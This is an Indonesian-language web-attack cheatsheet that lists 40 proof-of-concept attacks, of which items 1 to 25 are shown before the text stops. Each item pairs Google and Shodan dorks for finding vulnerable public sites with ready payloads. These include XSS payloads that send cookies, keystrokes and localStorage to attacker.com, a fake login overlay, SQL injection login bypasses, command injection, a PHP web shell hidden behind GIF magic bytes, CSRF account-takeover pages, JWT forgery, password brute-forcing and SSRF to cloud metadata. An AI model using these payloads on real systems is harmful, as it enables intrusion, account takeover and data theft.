# 🟡 PoC CHEATSHEET — LEVEL MEDIUM

> **Author**: TangselSecTeam | **Last Updated**: May 2026
> ⚠️ **Hanya untuk penetration testing yang sudah diotorisasi & tujuan pendidikan.**

---

## 📑 Daftar PoC Level Medium (40 Item)

| # | Nama PoC | Kategori | Bukti Berhasil |
|---|----------|----------|----------------|
| 1 | Reflected XSS | Injection / XSS | Alert/script muncul |
| 2 | Stored XSS | Injection / XSS | Script muncul saat halaman dibuka ulang |
| 3 | DOM XSS | Injection / XSS | Script berjalan dari sisi browser |
| 4 | SQL Injection Login Bypass | Injection | Login berhasil tanpa password valid |
| 5 | Error-Based SQLi | Injection | Error SQL muncul |
| 6 | Boolean-Based SQLi | Injection | Perbedaan halaman terlihat |
| 7 | Command Injection Basic | Injection | Output command muncul |
| 8 | Path Traversal Basic | Broken Access Control | Isi file dummy terlihat |
| 9 | File Upload Bypass Extension | Security Misconfiguration | File lolos validasi |
| 10 | File Upload MIME Bypass | Security Misconfiguration | File diterima sistem |
| 11 | CSRF Basic | Broken Access Control | Data berubah dari form eksternal |
| 12 | Insecure Direct API Access | Broken Access Control | Response API sensitif muncul |
| 13 | Forced Browsing | Broken Access Control | Halaman terbuka tanpa menu resmi |
| 14 | Parameter Tampering | Business Logic | Nilai berubah tidak semestinya |
| 15 | JWT None Algorithm | Auth Failure | Token palsu diterima |
| 16 | Weak JWT Secret | Auth Failure | Token dapat dibuat ulang |
| 17 | Session Fixation | Session Management | Session sebelum/sesudah login sama |
| 18 | Password Reset Token Weakness | Auth Failure | Reset akun dummy berhasil |
| 19 | Rate Limit Missing | Auth Failure | Tidak ada blokir/rate limit |
| 20 | SSRF Basic | SSRF | Server mengakses URL internal |
| 21 | XXE Basic | XML External Entity | Data dummy muncul |
| 22 | Insecure Deserialization | Software/Data Integrity | Role/status berubah |
| 23 | Mass Assignment | Broken Access Control | Role berubah |
| 24 | GraphQL Introspection | Security Misconfiguration | Schema muncul |
| 25 | API Excessive Data Exposure | API Security | Field sensitif terlihat |
| 26 | CSRF → Stored XSS | 🔗 Chained Attack | XSS tersimpan via CSRF |
| 27 | XSS → Session Hijacking | 🔗 Chained Attack | Cookie tereksfiltrasi |
| 28 | XSS → Keylogger / Exfiltration | 🔗 Chained Attack | Input user tercapture |
| 29 | XSS → CSRF Token Bypass | 🔗 Chained Attack | Aksi CSRF via XSS berhasil |
| 30 | SQLi → File Read / RCE | 🔗 Chained Attack | File terbaca / command jalan |
| 31 | Open Redirect | Broken Access Control | Redirect ke domain attacker |
| 32 | Open Redirect → Token Theft | 🔗 Chained Attack | Token tereksfiltrasi via redirect |
| 33 | CORS Misconfiguration | Security Misconfiguration | Origin attacker diterima |
| 34 | Host Header Poisoning | Security Misconfiguration | Reset link ke attacker domain |
| 35 | CRLF Injection | Injection | Header baru ter-inject |
| 36 | SSTI Basic | Injection | Template expression dieksekusi |
| 37 | XXE → SSRF | 🔗 Chained Attack | Server akses URL internal via XXE |
| 38 | SSRF → Cloud Metadata | 🔗 Chained Attack | Metadata cloud terekspos |
| 39 | File Upload → RCE | 🔗 Chained Attack | Web shell berjalan |
| 40 | HTTP Parameter Pollution | Injection | Parameter override berhasil |

---

# 1. Reflected XSS

**Kategori**: Injection / XSS | **OWASP**: A03  
**Tujuan**: Input ditampilkan kembali tanpa encoding

## Dork
```
# Google Dork
inurl:"search" | inurl:"q=" | inurl:"query=" | inurl:"keyword=" ext:php
inurl:"error=" | inurl:"msg=" | inurl:"message=" ext:php
inurl:".php?" intext:"<script>" | intext:"onerror"
inurl:"redirect=" | inurl:"url=" | inurl:"next="

# Shodan
http.html:"<input" http.html:"search" port:80,443
```

## Langkah

```bash
# Cari parameter yang di-reflect
GET /search?q=testXSS123
# Jika "testXSS123" muncul di HTML → coba payload

# ===== BASIC PAYLOADS =====
GET /search?q=<script>alert(1)</script>
GET /search?q=<img src=x onerror=alert(1)>
GET /search?q=<svg onload=alert(1)>
GET /search?q="><script>alert(document.domain)</script>
GET /search?q=' onfocus='alert(1)' autofocus='
GET /search?q=<body onload=alert(1)>
GET /search?q=<details open ontoggle=alert(1)>
GET /search?q=<marquee onstart=alert(1)>
GET /search?q=<video src=x onerror=alert(1)>
GET /search?q=<audio src=x onerror=alert(1)>
GET /search?q=<textarea onfocus=alert(1) autofocus>
GET /search?q=<select onfocus=alert(1) autofocus>
GET /search?q=<iframe src="javascript:alert(1)">
GET /search?q=<object data="javascript:alert(1)">

# ===== WAF BYPASS PAYLOADS =====
GET /search?q=<svg/onload=alert(1)>
GET /search?q=<svg onload=alert`1`>
GET /search?q=<svg onload=alert&lpar;1&rpar;>
GET /search?q=<ScRiPt>alert(1)</ScRiPt>
GET /search?q=<scr<script>ipt>alert(1)</scr</script>ipt>
GET /search?q=<img src=x onerror=\u0061lert(1)>
GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E
GET /search?q=<img src=x onerror="&#x61;lert(1)">
GET /search?q=<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>
GET /search?q=<svg><script>alert&#40;1&#41;</script>

# ===== CONTEXT-SPECIFIC PAYLOADS =====
# Di dalam attribute HTML:
" onmouseover="alert(1)
' onmouseover='alert(1)
" autofocus onfocus="alert(1)

# Di dalam tag <script>:
';alert(1)//
";alert(1)//
</script><script>alert(1)</script>

# Di dalam URL/href:
javascript:alert(1)
data:text/html,<script>alert(1)</script>

# ===== POLYGLOT XSS =====
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
"><img src=x onerror=alert(1)><!--
'-alert(1)-'
```

```bash
# Tool Otomatis
dalfox url "https://target.com/search?q=test"
dalfox url "https://target.com/search?q=test" --waf-evasion
python xsstrike.py -u "https://target.com/search?q=test"
python xsstrike.py -u "https://target.com/search?q=test" --fuzzer
kxss < urls.txt  # pipe dari gau/waybackurls
```

## Bukti
- Alert box muncul dengan `1` atau `document.domain`
- Screenshot alert box di browser

---

# 2. Stored XSS

**Kategori**: Injection / XSS | **OWASP**: A03  
**Tujuan**: Payload tersimpan di komentar/profil, muncul saat dibuka ulang

## Dork
```
# Google Dork
inurl:"comment" | inurl:"feedback" | inurl:"review" | inurl:"guestbook" ext:php
inurl:"post" | inurl:"blog" | inurl:"forum" intext:"<textarea"
inurl:"profile" intext:"bio" | intext:"about me" ext:php

# Shodan
http.html:"<textarea" http.html:"comment" port:80,443
```

## Langkah

```bash
# ===== BASIC STORED PAYLOADS =====
POST /api/comments {"body":"<script>alert('XSS')</script>"}
POST /api/profile  {"bio":"<img src=x onerror=alert(document.cookie)>"}
POST /api/feedback {"message":"<svg onload=alert(1)>"}
POST /api/posts    {"title":"<details open ontoggle=alert(1)>"}
POST /api/reviews  {"text":"<iframe srcdoc='<script>alert(1)</script>'>"}
POST /api/messages {"content":"<math><mtext><table><mglyph><svg><mtext><style><!--</style><img src=x onerror=alert(1)>"}

# ===== DATA EXFILTRATION PAYLOADS =====
# Cookie stealing
POST /api/comments {"body":"<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>"}

# Credential harvesting (fake login overlay)
POST /api/comments {"body":"<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999'><h2>Session expired. Please login again.</h2><form action='https://attacker.com/phish'><input name='user' placeholder='Username'><input name='pass' type='password' placeholder='Password'><button>Login</button></form></div>"}

# Keylogger injection
POST /api/comments {"body":"<script>document.onkeypress=function(e){new Image().src='https://attacker.com/log?k='+e.key}</script>"}

# LocalStorage/SessionStorage theft
POST /api/comments {"body":"<script>fetch('https://attacker.com/exfil',{method:'POST',body:JSON.stringify(localStorage)})</script>"}

# Buka halaman yang menampilkan data tersebut
# Jika alert/exfil muncul → Stored XSS confirmed
```

## Bukti
- Script muncul setiap kali halaman dibuka oleh siapapun
- Screenshot alert yang muncul dari halaman komentar/profil

---

# 3. DOM XSS

**Kategori**: Injection / XSS | **OWASP**: A03  
**Tujuan**: Manipulasi parameter frontend yang diproses oleh JavaScript

## Dork
```
# Google Dork — cari halaman SPA/JS-heavy dengan parameter yang di-render client-side
inurl:"?default=" | inurl:"?lang=" | inurl:"?page=" | inurl:"?redirect=" ext:html
inurl:"?callback=" | inurl:"?jsonp=" | inurl:"?next=" ext:html
inurl:"?template=" | inurl:"?view=" | inurl:"?tab=" | inurl:"?returnUrl="
site:target.com ext:js intext:"document.write" | intext:"innerHTML" | intext:".html("
site:target.com ext:js intext:"location.hash" | intext:"location.search" | intext:"document.URL"
site:target.com ext:js intext:"eval(" | intext:"setTimeout(" | intext:"setInterval("

# Shodan — SPA frameworks (Angular, React, Vue rentan DOM XSS)
http.html:"ng-app" port:80,443    # AngularJS (prone to DOM XSS)
http.html:"__NEXT_DATA__" port:80,443  # Next.js
http.html:"window.__INITIAL_STATE__" port:80,443  # SSR frameworks
```

## Langkah

```bash
# Cari DOM sources
# URL hash: https://target.com/page#<img src=x onerror=alert(1)>
# URL param: https://target.com/page?default=<script>alert(1)</script>

# Common sinks di JS:
# document.write(), innerHTML, eval(), jQuery.html()

# Payload via hash
https://target.com/page#<img src=x onerror=alert(1)>

# Payload via param
https://target.com/page?lang=<script>alert(1)</script>
```

## Bukti
- Alert muncul tanpa request ke server (pure client-side)
- Payload terlihat di DOM tapi tidak di response server

---

# 4. SQL Injection Login Bypass

**Kategori**: Injection | **OWASP**: A03  
**Tujuan**: Melewati login tanpa password valid

## Dork
```
# Google Dork
inurl:"/admin/login" | inurl:"/login.php" | inurl:"signin"
intitle:"Admin Login" | intitle:"Control Panel" inurl:".php"
inurl:"admin" intitle:"login" intext:"username" intext:"password"

# Shodan
http.title:"Login" "X-Powered-By: PHP" port:80,443
http.title:"Admin" port:80,443,8080
```

## Langkah

```bash
# Di form login
Username: admin'--
Password: (apapun)

# Atau
Username: ' OR 1=1--
Password: ' OR 1=1--

# Variasi
Username: admin' OR '1'='1'--
Username: " OR ""="
Username: admin'#
Username: admin')--
```

## Bukti
- Berhasil login sebagai admin tanpa password benar
- Screenshot dashboard setelah login dengan payload SQLi

---

# 5. Error-Based SQL Injection

**Kategori**: Injection | **OWASP**: A03  
**Tujuan**: Input memunculkan error SQL yang mengekspos data

## Dork
```
# Google Dork
inurl:".php?id=" intext:"sql syntax" | intext:"mysql_fetch"
inurl:".php?id=" intext:"Warning: mysql" | intext:"SQLSTATE"
inurl:".asp?id=" intext:"ODBC" | intext:"Microsoft OLE DB"

# Shodan
"X-Powered-By: PHP" port:80 http.html:"?id="
```

## Langkah

```bash
# Trigger SQL error
GET /products?id=1'
GET /products?id=1" 
GET /products?id=1 AND 1=CONVERT(int,@@version)--
GET /products?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

# SQLMap
sqlmap -u "https://target.com/products?id=1" --batch --dbs
```

## Bukti
- Error: `You have an error in your SQL syntax...`
- Database version/name terlihat di error message

---

# 6. Boolean-Based SQL Injection

**Kategori**: Injection | **OWASP**: A03  
**Tujuan**: Respons berubah berdasarkan kondisi benar/salah

## Dork
```
# Google Dork
inurl:".php?id=" -intext:"error" -intext:"syntax"
inurl:".php?cat=" | inurl:".php?page=" | inurl:".php?sort="
inurl:"product" inurl:"?id=" ext:php

# Shodan
"X-Powered-By: PHP" -"cloudflare" port:80
```

## Langkah

```bash
# TRUE condition → halaman normal
GET /products?id=1 AND 1=1--

# FALSE condition → halaman berbeda/kosong
GET /products?id=1 AND 1=2--

# Jika response berbeda → Boolean SQLi confirmed
# Extract data
GET /products?id=1 AND SUBSTRING((SELECT database()),1,1)='a'--
```

## Bukti
- Halaman berbeda antara `AND 1=1` vs `AND 1=2`
- Screenshot perbandingan kedua response

---

# 7. Command Injection Basic

**Kategori**: Injection | **OWASP**: A03  
**Tujuan**: Input menjalankan command di server/container

## Dork
```
# Google Dork
inurl:"ping.php" | inurl:"traceroute.php" | inurl:"nslookup.php"
inurl:"diagnostic" intext:"ping" | intext:"host"
intitle:"Network Tools" inurl:".php"

# Shodan
"Network Tools" "ping" port:80,443
http.html:"ping" http.html:"traceroute" port:80
```

## Langkah

```bash
# Cari input yang memanggil OS command (ping, nslookup, dll)
# Tambahkan command separator

# Payloads
127.0.0.1; whoami
127.0.0.1 | id
127.0.0.1 && cat /etc/hostname
127.0.0.1 || ls
$(whoami)
`id`

# Tool
commix -u "https://target.com/ping?ip=127.0.0.1" --batch
```

## Bukti
- Output command (`whoami`, `id`) muncul di response
- Screenshot output command di halaman web

---

# 8. Path Traversal Basic

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: Membaca file lewat parameter path

## Dork
```
# Google Dork
inurl:"file=" | inurl:"path=" | inurl:"doc=" | inurl:"page=" ext:php
inurl:"download.php?file=" | inurl:"read.php?file="
inurl:"view.php?page=" | inurl:"include.php?file="
inurl:"../" | inurl:"%2e%2e%2f" ext:php

# Shodan
http.html:"file=" http.html:"download" port:80,443
```

## Langkah

```bash
# Cari parameter file/path
GET /download?file=../../../etc/passwd
GET /view?page=....//....//....//etc/passwd
GET /read?doc=..%2f..%2f..%2fetc%2fpasswd
GET /image?path=../../../etc/hostname

# Windows
GET /download?file=..\..\..\..\windows\win.ini
GET /download?file=....\\....\\....\\windows\\win.ini
```

## Bukti
- Isi file `/etc/passwd` atau `win.ini` muncul di response
- Screenshot konten file yang seharusnya tidak bisa diakses

---

# 9. File Upload Bypass Extension

**Kategori**: Security Misconfiguration | **OWASP**: A05  
**Tujuan**: Upload file dengan ekstensi ganda untuk bypass filter

## Dork
```
# Google Dork
inurl:"upload.php" | inurl:"file_upload" | inurl:"filemanager"
inurl:"wp-content/uploads/" ext:php | ext:phtml
inurl:"FCKeditor" | inurl:"ckeditor" inurl:"upload"

# Shodan
http.html:"upload" "multipart/form-data" port:80
```

## Langkah

```bash
# Ekstensi ganda
shell.php.jpg
shell.php.png
shell.pHp
shell.php5
shell.phtml

# Null byte (legacy)
shell.php%00.jpg
shell.php\x00.jpg

# Upload via Burp → ubah filename
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"

# Cek apakah file bisa diakses
GET /uploads/shell.php.jpg
```

## Bukti
- File dengan ekstensi manipulasi berhasil diupload
- File lolos validasi ekstensi server

---

# 10. File Upload MIME Bypass

**Kategori**: Security Misconfiguration | **OWASP**: A05  
**Tujuan**: MIME type dimanipulasi agar file berbahaya diterima

## Dork
```
# Google Dork
inurl:"upload" intext:"file type" | intext:"allowed" ext:php
inurl:"/uploads/" ext:php | ext:php5 | ext:phtml

# Shodan
http.html:"Content-Type" http.html:"upload" port:80,443
```

## Langkah

```bash
# Di Burp, ubah Content-Type
# Asli:
Content-Type: application/x-php

# Diubah jadi:
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# Tambah magic bytes di awal file
# GIF: GIF89a<?php system($_GET['cmd']); ?>
# JPEG: \xFF\xD8\xFF\xE0 + payload
```

## Bukti
- File PHP berhasil diupload dengan MIME type image
- Server menerima file tanpa error

---

# 11. CSRF Basic

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: Aksi bisa dilakukan tanpa token CSRF

## Dork
```
# Google Dork
inurl:"change-password" | inurl:"update-profile" | inurl:"settings" ext:php
inurl:"transfer" | inurl:"delete" | inurl:"remove" ext:php
intext:"<form" -intext:"csrf" -intext:"_token" ext:php

# Shodan
http.html:"<form" http.html:"method=\"POST\"" port:80
```

## Langkah

```html
<!-- ===== 1. CSRF FORM BASIC (Auto-submit) ===== -->
<html>
<body>
  <h1>You Won a Prize!</h1>
  <form action="https://target.com/api/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="submit" value="Claim Prize">
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>

<!-- ===== 2. CSRF VIA IMAGE TAG (GET request) ===== -->
<img src="https://target.com/api/delete-account?confirm=yes" style="display:none">
<img src="https://target.com/api/transfer?to=attacker&amount=1000" style="display:none">

<!-- ===== 3. CSRF JSON BODY (API endpoint) ===== -->
<html>
<body>
<script>
fetch('https://target.com/api/change-password', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({"new_password": "hacked123"})
});
</script>
</body>
</html>

<!-- ===== 4. CSRF VIA XMLHttpRequest ===== -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/update-profile', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('email=attacker@evil.com&name=pwned');
</script>

<!-- ===== 5. CSRF MULTI-ACTION (multiple requests) ===== -->
<script>
// Step 1: Change email
fetch('https://target.com/api/change-email', {
  method: 'POST', credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: '{"email":"attacker@evil.com"}'
}).then(() => {
  // Step 2: Request password reset to new email
  fetch('https://target.com/api/forgot-password', {
    method: 'POST', credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: '{"email":"attacker@evil.com"}'
  });
});
</script>

<!-- ===== 6. CSRF VIA IFRAME (silent) ===== -->
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://target.com/api/change-email" method="POST" target="csrf-frame">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

<!-- Checklist CSRF -->
<!-- Cek: apakah ada token CSRF di form? -->
<!-- Cek: apakah SameSite cookie = None/Lax? -->
<!-- Cek: apakah server validasi Origin/Referer header? -->
<!-- Cek: apakah token CSRF bisa di-reuse / predictable? -->
```

## Bukti
- Email/data berubah setelah korban membuka halaman attacker
- Tidak ada CSRF token di request

---

# 12. Insecure Direct API Access

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: API bisa diakses tanpa role yang benar

## Dork
```
# Google Dork
inurl:"/api/admin" | inurl:"/api/v1/admin" | inurl:"/api/internal"
inurl:"/api/" filetype:json intext:"password" | intext:"secret"
http.html:"swagger" | http.html:"api-docs" port:80,443

# Shodan
http.title:"Swagger UI" port:80,443,8080
http.html:"/api/" port:80,443
```

## Langkah

```bash
# Akses admin API dengan token user biasa
GET /api/admin/users
Authorization: Bearer REGULAR_USER_TOKEN

# Atau tanpa token sama sekali
GET /api/admin/users
# (no Authorization header)

# Cek API endpoint lain
GET /api/admin/config
GET /api/admin/logs
POST /api/admin/delete-user/123
```

## Bukti
- Response 200 OK dengan data admin (list users, config)
- API tidak memvalidasi role/permission

---

# 13. Forced Browsing

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: Mengakses URL tersembunyi langsung tanpa navigasi resmi

## Dork
```
# Google Dork
site:target.com inurl:"/admin" | inurl:"/debug" | inurl:"/internal"
site:target.com intitle:"Index of" | intitle:"Directory listing"
site:target.com filetype:log | filetype:bak | filetype:sql

# Shodan
http.title:"Index of /" port:80,443
```

## Langkah

```bash
# Akses langsung URL yang tidak ada di menu
GET /admin/settings
GET /internal/reports
GET /debug/info
GET /api/v1/internal/users

# Brute force
ffuf -u https://target.com/FUZZ -w common.txt -mc 200,301,302
gobuster dir -u https://target.com -w directory-list-2.3-medium.txt
```

## Bukti
- Halaman terbuka meskipun tidak ada link di navigasi
- Screenshot halaman tersembunyi yang berhasil diakses

---

# 14. Parameter Tampering

**Kategori**: Business Logic | **OWASP**: A04  
**Tujuan**: Mengubah harga, role, quantity, diskon di request

## Dork
```
# Google Dork
inurl:"checkout" | inurl:"cart" | inurl:"payment" ext:php
inurl:"price=" | inurl:"amount=" | inurl:"qty=" | inurl:"discount="
inurl:"coupon" | inurl:"promo" | inurl:"voucher"

# Shodan
http.html:"checkout" http.html:"price" port:80,443
```

## Langkah

```bash
# Intercept request di Burp, ubah nilai
POST /api/checkout
{"product_id":1,"quantity":1,"price":100}
# Ubah jadi:
{"product_id":1,"quantity":1,"price":1}
{"product_id":1,"quantity":-1,"price":100}
{"product_id":1,"quantity":1,"price":0,"discount":99}

# Ubah role
POST /api/update-profile
{"name":"test","role":"admin"}
{"name":"test","isAdmin":true}
```

## Bukti
- Harga berubah menjadi 1 atau 0 di checkout
- Role berhasil diubah ke admin

---

# 15. JWT None Algorithm

**Kategori**: Authentication Failure | **OWASP**: A07  
**Tujuan**: Token menerima algoritma `none` (tanpa signature)

## Dork
```
# Google Dork
intext:"eyJhbGciOi" | intext:"eyJ0eXAiOi"  # Base64 JWT header
inurl:"/api/" intext:"Bearer" | intext:"Authorization"
site:github.com "jwt" "secret" "password"

# Shodan
http.html:"JWT" | http.html:"Bearer" port:80,443,8080
```

## Langkah

```bash
# Decode JWT → ubah header
# Original: {"alg":"HS256","typ":"JWT"}
# Ubah:     {"alg":"none","typ":"JWT"}

# Encode header baru (base64url)
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='

# Ubah payload (role → admin)
echo -n '{"sub":"admin","role":"admin"}' | base64 | tr '+/' '-_' | tr -d '='

# Gabung: HEADER.PAYLOAD. (tanpa signature)
# Kirim token baru ke server

# Tool
python3 jwt_tool.py TOKEN -X a    # Test algorithm none
```

## Bukti
- Server menerima token dengan `alg: none`
- Akses sebagai admin berhasil

---

# 16. Weak JWT Secret

**Kategori**: Authentication Failure | **OWASP**: A07  
**Tujuan**: Secret JWT lemah → bisa di-crack dan buat token sendiri

## Dork
```
# Google Dork
site:github.com "JWT_SECRET" | "jwt_key" | "token_secret" filetype:env
site:github.com "HS256" "secret" filename:.env
intext:"JWT" intext:"secret" filetype:yml | filetype:json

# Shodan
http.html:"eyJhbGciOiJIUzI1NiI" port:80,443
```

## Langkah

```bash
# Crack JWT secret
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
python3 jwt_tool.py TOKEN -C -d rockyou.txt

# Setelah secret diketahui, buat token baru
python3 -c "
import jwt
token = jwt.encode({'sub':'admin','role':'admin'}, 'secret123', algorithm='HS256')
print(token)
"
```

## Bukti
- Secret berhasil di-crack (misal: `secret`, `password`, `123456`)
- Token baru yang dibuat diterima server

---

# 17. Session Fixation

**Kategori**: Session Management | **OWASP**: A07  
**Tujuan**: Session ID tidak berubah setelah login

## Dork
```
# Google Dork
inurl:"PHPSESSID" | inurl:"JSESSIONID" | inurl:"ASP.NET_SessionId"
inurl:"session" inurl:"login" ext:php

# Shodan
http.html:"PHPSESSID" port:80,443
http.html:"JSESSIONID" port:8080
```

## Langkah

```bash
# 1. Akses halaman login → catat session ID
curl -c - https://target.com/login
# Session: abc123

# 2. Login dengan credential valid
# 3. Catat session ID setelah login
# Session masih: abc123 → VULN

# Seharusnya session ID berubah setelah login (session regeneration)
```

## Bukti
- Session ID sebelum login == Session ID setelah login
- Screenshot perbandingan session ID

---

# 18. Password Reset Token Weakness

**Kategori**: Authentication Failure | **OWASP**: A07  
**Tujuan**: Token reset password mudah ditebak

## Dork
```
# Google Dork
inurl:"reset" inurl:"token=" | inurl:"code=" ext:php
inurl:"forgot-password" | inurl:"password_reset"
intitle:"Reset Password" inurl:".php"

# Shodan
http.html:"reset password" http.html:"token" port:80,443
```

## Langkah

```bash
# Request password reset beberapa kali
POST /api/forgot-password {"email":"user@test.com"}

# Cek token di email/URL:
# Apakah sequential? token=1001, token=1002
# Apakah timestamp-based? token=1715500800
# Apakah pendek? token=1234
# Apakah MD5 dari email? token=md5(user@test.com)

# Cek apakah token expire
# Gunakan token lama setelah 24+ jam
```

## Bukti
- Token bisa ditebak/diprediksi
- Reset password akun dummy berhasil dengan token yang di-craft

---

# 19. Rate Limit Missing

**Kategori**: Authentication Failure | **OWASP**: A07  
**Tujuan**: Login bisa dicoba berkali-kali tanpa blokir

## Dork
```
# Google Dork
inurl:"/login" | inurl:"/signin" ext:php -"captcha" -"recaptcha"
intitle:"Login" -intext:"captcha" -intext:"rate limit" ext:php

# Shodan
http.title:"Login" -"captcha" port:80,443
```

## Langkah

```bash
# Kirim 100+ request login
# Burp Intruder: Sniper mode, payload = password list

# Hydra
hydra -l admin -P rockyou.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid" -t 50

# Cek: ada lockout? CAPTCHA? delay? HTTP 429?
# Jika tidak ada → rate limit missing

# ffuf
ffuf -u https://target.com/login -X POST \
  -d "user=admin&pass=FUZZ" \
  -w rockyou.txt -mc all -fc 401
```

## Bukti
- 100+ attempt tanpa lockout atau CAPTCHA
- Tidak ada response 429 Too Many Requests

---

# 20. SSRF Basic

**Kategori**: SSRF | **OWASP**: A10  
**Tujuan**: Server mengambil URL yang dikontrol user

## Dork
```
# Google Dork
inurl:"url=http" | inurl:"link=http" | inurl:"src=http" ext:php
inurl:"proxy.php?url=" | inurl:"fetch.php?url="
inurl:"preview" inurl:"url=" | inurl:"link="

# Shodan
redis port:6379
"elastic" port:9200
http.title:"Jenkins" port:8080
```

## Langkah

```bash
# Cari parameter URL
POST /api/fetch {"url":"http://127.0.0.1:80"}
GET /proxy?url=http://localhost/admin
GET /preview?link=http://169.254.169.254/latest/meta-data/

# Internal port scan
POST /api/fetch {"url":"http://127.0.0.1:6379"}  # Redis
POST /api/fetch {"url":"http://127.0.0.1:3306"}  # MySQL
POST /api/fetch {"url":"http://127.0.0.1:9200"}  # Elasticsearch

# File protocol
POST /api/fetch {"url":"file:///etc/passwd"}
```

## Bukti
- Server mengakses URL internal dan menampilkan response
- Data internal service terlihat

---

# 21. XXE Basic

**Kategori**: XML External Entity | **OWASP**: A05  
**Tujuan**: Parser XML membaca entity lokal

## Dork
```
# Google Dork
inurl:"xmlrpc.php" | inurl:"/soap" | inurl:"?wsdl"
inurl:"xml" inurl:"upload" | inurl:"import" ext:php
filetype:xml inurl:"sitemap" | inurl:"feed"

# Shodan
http.html:"wsdl" port:80,443
http.html:"xmlrpc" port:80,443
```

## Langkah

```xml
<!-- Payload XXE basic -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<data>&xxe;</data>

<!-- Kirim ke endpoint yang menerima XML -->
POST /api/upload HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

## Bukti
- Isi file `/etc/hostname` atau `/etc/passwd` muncul di response
- Entity XML di-resolve oleh parser

---

# 22. Insecure Deserialization

**Kategori**: Software/Data Integrity | **OWASP**: A08  
**Tujuan**: Object serialized bisa dimodifikasi → role/status berubah

## Dork
```
# Google Dork
intext:"unserialize(" ext:php | intext:"pickle.loads" ext:py
intext:"ObjectInputStream" ext:java
intext:"__VIEWSTATE" ext:aspx

# Shodan
"X-Powered-By: Servlet" port:8080
"Apache Tomcat" port:8080
```

## Langkah

```bash
# Jika cookie/token berisi serialized object
# Decode → ubah role → encode ulang

# PHP (base64 serialized)
echo "Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NDoidGVzdCI7czo0OiJyb2xlIjtzOjQ6InVzZXIiO30=" | base64 -d
# O:4:"User":2:{s:4:"name";s:4:"test";s:4:"role";s:4:"user";}
# Ubah "user" → "admin"
# O:4:"User":2:{s:4:"name";s:4:"test";s:4:"role";s:5:"admin";}

# Python pickle
import pickle, base64
# Decode cookie → modify → re-encode

# Java (ysoserial)
java -jar ysoserial.jar CommonsCollections1 'id' | base64
```

## Bukti
- Role berubah dari `user` ke `admin` setelah modifikasi object
- Server menerima object yang dimodifikasi

---

# 23. Mass Assignment

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: Field tersembunyi seperti isAdmin diterima oleh API

## Dork
```
# Google Dork
inurl:"/api/register" | inurl:"/api/signup" | inurl:"/api/update-profile"
inurl:"/api/" intext:"role" | intext:"isAdmin" | intext:"privilege"

# Shodan
http.html:"api" http.html:"register" port:80,443
```

## Langkah

```bash
# Register/update dengan field tambahan
POST /api/register
{"username":"test","email":"a@b.com","password":"pass123","role":"admin"}

POST /api/update-profile
{"name":"test","isAdmin":true}

POST /api/update-profile
{"name":"test","privilege_level":9999}

# Coba berbagai field name
role, isAdmin, is_admin, admin, privilege, level, group_id, type
```

## Bukti
- User mendapat role admin setelah menambahkan field `role` atau `isAdmin`
- Response menunjukkan privilege berubah

---

# 24. GraphQL Introspection Exposed

**Kategori**: Security Misconfiguration | **OWASP**: A05  
**Tujuan**: Schema GraphQL bisa dilihat publik

## Dork
```
# Google Dork
inurl:"/graphql" | inurl:"/graphiql" | inurl:"/playground"
inurl:"/graphql" intext:"__schema" | intext:"introspection"
intitle:"GraphiQL" | intitle:"GraphQL Playground"

# Shodan
http.html:"graphql" port:80,443,8080
http.title:"GraphiQL" port:80,443
```

## Langkah

```bash
# Introspection query
POST /graphql
Content-Type: application/json

{"query":"{ __schema { types { name fields { name type { name } } } } }"}

# Full introspection
{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name } } type { name } } } } }"}

# Tool
# GraphQL Voyager, InQL (Burp), graphql-cop
python3 graphql-cop.py -t https://target.com/graphql
```

## Bukti
- Schema lengkap terlihat (types, queries, mutations)
- Endpoint sensitif terekspos (deleteUser, updateRole, dll)

---

# 25. API Excessive Data Exposure

**Kategori**: API Security | **OWASP**: API3  
**Tujuan**: API mengirim data lebih banyak dari yang ditampilkan di UI

## Dork
```
# Google Dork
inurl:"/api/users" | inurl:"/api/user/me" | inurl:"/api/profile"
inurl:"/api/" filetype:json intext:"password_hash" | intext:"ssn"
http.html:"swagger" | http.html:"openapi" port:80,443

# Shodan
http.title:"Swagger UI" port:80,443,8080
```

## Langkah

```bash
# Bandingkan data di UI vs response API
# UI menampilkan: nama, email
# API response: nama, email, password_hash, ssn, internal_notes, created_ip

# Cek di Burp / DevTools Network tab
GET /api/users/me
